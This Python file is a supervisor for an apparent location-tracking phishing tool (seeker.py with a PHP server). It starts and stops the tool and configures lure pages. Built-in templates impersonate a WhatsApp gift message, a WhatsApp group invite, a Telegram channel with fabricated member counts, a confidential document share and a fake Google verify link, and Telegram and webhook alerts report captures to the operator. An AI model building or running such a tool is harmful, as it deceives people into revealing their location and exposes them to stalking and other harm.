#!/usr/bin/env python3
"""
Tracker Service Supervisor
Controls starting, stopping, configuring, and monitoring seeker.py and PHP server
via REST API for the Admin Dashboard.
"""

import os
import sys
import subprocess
import signal
import psutil
import json
import time
from datetime import datetime

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
PID_FILE = os.path.join(BASE_DIR, 'pid')
TEMPLATES_JSON = os.path.join(BASE_DIR, 'template', 'templates.json')
LOG_DIR = os.path.join(BASE_DIR, 'logs')
RUNTIME_LOG = os.path.join(LOG_DIR, 'seeker_runtime.log')
CONFIG_FILE = os.path.join(BASE_DIR, 'db', 'config.json')

tracker_process = None

DEFAULT_CONFIG = {
    "template_id": 2,
    "template_name": "WhatsApp",
    "port": 8080,
    "telegram": "",
    "webhook": "",
    "debug_http": True,
    "kml": "",
    "redirect": "",
    "title": "",
    "image": "",
    "desc": "",
    "btn_text": "",
    "sitename": "",
    "mem_num": "",
    "online_num": "",
    "display_url": "",
    "started_at": None,
}

current_config = DEFAULT_CONFIG.copy()


def load_config():
    global current_config
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, 'r', encoding='utf-8') as f:
                saved = json.load(f)
                merged = DEFAULT_CONFIG.copy()
                merged.update(saved)
                return merged
        except Exception:
            pass
    return DEFAULT_CONFIG.copy()


def save_config(cfg):
    try:
        os.makedirs(os.path.dirname(CONFIG_FILE), exist_ok=True)
        with open(CONFIG_FILE, 'w', encoding='utf-8') as f:
            json.dump(cfg, f, indent=2)
    except Exception as e:
        print(f"[!] Warning: Could not save config to {CONFIG_FILE}: {e}")


def get_templates():
    if not os.path.exists(TEMPLATES_JSON):
        return []
    with open(TEMPLATES_JSON, 'r', encoding='utf-8') as f:
        data = json.load(f)
        templates = data.get('templates', [])
        result = []
        for idx, t in enumerate(templates):
            result.append({
                "id": idx,
                "name": t.get("name"),
                "dir_name": t.get("dir_name"),
            })
        return result


def is_tracker_running():
    global tracker_process
    
    # 1. Check if our tracker_process object is alive
    if tracker_process is not None:
        if tracker_process.poll() is None:
            return True
        else:
            tracker_process = None

    # 2. Check if PHP process in pid file is alive
    if os.path.exists(PID_FILE):
        try:
            with open(PID_FILE, 'r') as f:
                content = f.read().strip()
                if content.isdigit():
                    php_pid = int(content)
                    if psutil.pid_exists(php_pid):
                        return True
        except Exception:
            pass

    # 3. Check if any seeker.py process is alive
    for proc in psutil.process_iter(['pid', 'cmdline']):
        try:
            cmd = " ".join(proc.info['cmdline'] or [])
            if 'seeker.py' in cmd and proc.pid != os.getpid():
                return True
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            pass

    return False


def get_tracker_logs(max_lines=100):
    if not os.path.exists(RUNTIME_LOG):
        return []
    try:
        with open(RUNTIME_LOG, 'r', encoding='utf-8', errors='replace') as f:
            lines = f.readlines()
            return [line.rstrip() for line in lines[-max_lines:] if line.strip()]
    except Exception:
        return []


def clear_tracker_logs():
    try:
        if os.path.exists(RUNTIME_LOG):
            with open(RUNTIME_LOG, 'w', encoding='utf-8') as f:
                f.write(f"=== Logs cleared at {datetime.now()} ===\n")
            return True
    except Exception:
        pass
    return False


def get_tracker_status():
    global current_config
    running = is_tracker_running()
    templates = get_templates()
    saved_cfg = load_config()

    t_id = current_config.get('template_id', saved_cfg.get('template_id', 0))
    t_name = current_config.get('template_name', saved_cfg.get('template_name', 'NearYou'))
    port = current_config.get('port', saved_cfg.get('port', 8080))
    
    logs = get_tracker_logs(30)

    return {
        "running": running,
        "template_id": t_id,
        "template_name": t_name,
        "port": port,
        "url": f"http://0.0.0.0:{port}",
        "started_at": current_config.get('started_at'),
        "config": saved_cfg,
        "templates": templates,
        "logs": logs
    }


def start_tracker(config_dict=None):
    global tracker_process, current_config
    
    # Stop existing instance if running
    stop_tracker()
    
    # Ensure log directory exists
    os.makedirs(LOG_DIR, exist_ok=True)
    
    # Clean up stale files
    if os.path.exists(PID_FILE):
        try:
            os.remove(PID_FILE)
        except Exception:
            pass

    # Merge with saved config or defaults
    cfg = load_config()
    if config_dict and isinstance(config_dict, dict):
        cfg.update(config_dict)

    template_id = int(cfg.get('template_id', 2))
    port = int(cfg.get('port', 8080))

    templates = get_templates()
    template_name = "WhatsApp"
    for t in templates:
        if t["id"] == template_id:
            template_name = t["name"]
            break
    cfg['template_name'] = template_name

    # Build environment variables
    env = os.environ.copy()
    env['PORT'] = str(port)
    env['TEMPLATE'] = str(template_id)
    env['DEBUG_HTTP'] = '1' if cfg.get('debug_http', True) else '0'

    # Optional notifications & parameters from config
    param_keys = [
        'TELEGRAM', 'WEBHOOK', 'KML',
        'REDIRECT', 'TITLE', 'IMAGE', 'DESC', 'BTN_TEXT', 'MODAL_MSG',
        'SITENAME', 'MEM_NUM', 'ONLINE_NUM', 'DISPLAY_URL'
    ]
    for key in param_keys:
        lower_key = key.lower()
        val = cfg.get(lower_key) or cfg.get(key)
        if val is not None and str(val).strip():
            env[key] = str(val).strip()

    TEMPLATE_DEFAULTS = {
        0: {},
        1: {"REDIRECT": "https://drive.google.com"},
        2: {
            "TITLE": "Name sent you a gift.",
            "DESC": "Please click the link to grab the gift.",
            "BTN_TEXT": "🎁 Open Gift",
            "IMAGE": "https://images.unsplash.com/photo-1549465220-1a8b9238cd48?w=1200&h=630&fit=crop"
        },
        3: {
            "TITLE": "Project Updates & Group",
            "DESC": "WhatsApp Group Invite",
            "BTN_TEXT": "Join Chat",
            "IMAGE": "template/whatsapp_redirect/images/ZIvBTrQd9nP.png",
            "REDIRECT": "https://chat.whatsapp.com"
        },
        4: {"TITLE": "News & Signals Channel", "IMAGE": "template/telegram/images/Arrow_1x.png", "DESC": "Official Group for Updates", "MEM_NUM": "1,420", "ONLINE_NUM": "84"},
        5: {"TITLE": "Conference Meeting Topic"},
        6: {"REDIRECT": "https://google.com", "DISPLAY_URL": "https://google.com/verify"},
        7: {
            "SITENAME": "Cloud Storage",
            "TITLE": "Confidential Document Share",
            "DESC": "Click to view the attached file.",
            "IMAGE": "https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600",
            "REDIRECT": "https://google.com"
        }
    }

    # Apply template defaults for any missing/empty parameter
    defaults = TEMPLATE_DEFAULTS.get(template_id, {})
    for k, default_val in defaults.items():
        if k not in env or not str(env[k]).strip():
            env[k] = default_val

    # Purge stale corporate fallback text from previous sessions
    if env.get('TITLE') in ['Project Documents & Asset Review', 'WhatsApp Group Invite']:
        env['TITLE'] = defaults.get('TITLE', 'Name sent you a gift.')
    if env.get('DESC') in ['Please review the attached project files at the link below:', 'WhatsApp Group Invite']:
        env['DESC'] = defaults.get('DESC', 'Please click the link to grab the gift.')
    if not env.get('IMAGE') or 'w=600' in env.get('IMAGE', ''):
        env['IMAGE'] = defaults.get('IMAGE', 'https://images.unsplash.com/photo-1549465220-1a8b9238cd48?w=1200&h=630&fit=crop')

    # Keep cfg aligned with resolved env
    for k in ['TITLE', 'DESC', 'IMAGE', 'BTN_TEXT', 'MODAL_MSG']:
        if k in env:
            cfg[k.lower()] = env[k]

    # Save active config
    cfg['started_at'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    save_config(cfg)
    current_config = cfg

    # Open runtime log file
    log_fp = open(RUNTIME_LOG, 'a', encoding='utf-8')
    log_fp.write(f"\n=======================================================\n")
    log_fp.write(f"[+] Launching Seeker ({template_name} - Template #{template_id}) on port {port}\n")
    log_fp.write(f"[+] Started at: {cfg['started_at']}\n")
    if env.get('TITLE'):
        log_fp.write(f"[+] Title: {env['TITLE']}\n")
    if env.get('DESC'):
        log_fp.write(f"[+] Description: {env['DESC']}\n")
    if env.get('BTN_TEXT'):
        log_fp.write(f"[+] Action Button: {env['BTN_TEXT']}\n")
    if env.get('TELEGRAM'):
        log_fp.write(f"[+] Telegram Alerts: ENABLED\n")
    if env.get('WEBHOOK'):
        log_fp.write(f"[+] Webhook Alerts: ENABLED\n")
    log_fp.write(f"=======================================================\n")
    log_fp.flush()

    cmd = [sys.executable, os.path.join(BASE_DIR, 'seeker.py'), '-t', str(template_id), '-p', str(port)]
    
    tracker_process = subprocess.Popen(
        cmd,
        cwd=BASE_DIR,
        env=env,
        stdout=log_fp,
        stderr=subprocess.STDOUT
    )

    # Wait briefly to let seeker and php start
    time.sleep(2)

    return get_tracker_status()


def stop_tracker():
    global tracker_process, current_config

    # 1. Terminate tracker_process if tracked
    if tracker_process is not None:
        try:
            tracker_process.terminate()
            tracker_process.wait(timeout=2)
        except Exception:
            try:
                tracker_process.kill()
            except Exception:
                pass
        tracker_process = None

    # 2. Kill PHP process recorded in PID file
    if os.path.exists(PID_FILE):
        try:
            with open(PID_FILE, 'r') as f:
                content = f.read().strip()
                if content.isdigit():
                    php_pid = int(content)
                    if psutil.pid_exists(php_pid):
                        p = psutil.Process(php_pid)
                        p.terminate()
                        try:
                            p.wait(timeout=2)
                        except psutil.TimeoutExpired:
                            p.kill()
            os.remove(PID_FILE)
        except Exception:
            if os.path.exists(PID_FILE):
                try:
                    os.remove(PID_FILE)
                except Exception:
                    pass

    # 3. Kill any lingering seeker.py or php processes
    port = current_config.get('port', 8080)
    for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
        try:
            cmd = " ".join(proc.info['cmdline'] or [])
            if ('seeker.py' in cmd and proc.pid != os.getpid()) or (f':{port}' in cmd and 'php' in cmd):
                proc.terminate()
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            pass

    current_config["started_at"] = None

    # Log stoppage
    if os.path.exists(RUNTIME_LOG):
        try:
            with open(RUNTIME_LOG, 'a', encoding='utf-8') as f:
                f.write(f"\n[!] Tracker stopped at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        except Exception:
            pass

    return get_tracker_status()
